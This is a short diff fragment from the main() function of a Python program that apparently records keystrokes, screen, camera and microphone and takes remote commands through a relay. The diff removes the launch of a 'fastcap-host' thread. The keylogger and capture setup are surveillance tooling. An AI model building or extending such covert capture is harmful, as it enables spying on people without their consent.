@@ -173,9 +173,6 @@ def main():
         relay.init(controller.handle_command, recorder, camera, mic)
         relay.run()
 
-    if fch:
-        threading.Thread(target=fch.start, daemon=True, name="fastcap-host").start()
-
     kl.Keylogger(broadcast_key).start()
     capture = sc.ScreenCapture(broadcast_frame, fps=25, quality=82, scale=0.85)
     capture.attach_recorder(recorder)
